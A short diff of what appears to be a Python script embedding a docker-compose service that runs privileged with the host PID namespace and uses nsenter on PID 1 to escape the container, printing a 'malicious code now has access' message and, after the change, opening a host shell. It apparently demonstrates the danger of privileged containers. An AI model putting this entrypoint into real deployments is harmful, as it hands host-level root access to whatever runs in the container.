@@ -15,9 +15,10 @@ services:
     privileged: true
     pid: host
 
-    entrypoint: [ "bash", "-c", "nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c 'sleep 1;echo\"Malicious code now has access to the $(whoami) user on the host system\n\n> Try to exec whoami or commands with root privileges\"'" ]
+    entrypoint: [ "bash", "-c", "nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c 'sleep 1;echo \"Malicious code now has access to the $(whoami) user on the host system\n> Try to exec whoami or commands with root privileges\"; bash'" ]
 
     profiles: ["exclude-from-up"]
+
 """)
 
 import subprocess
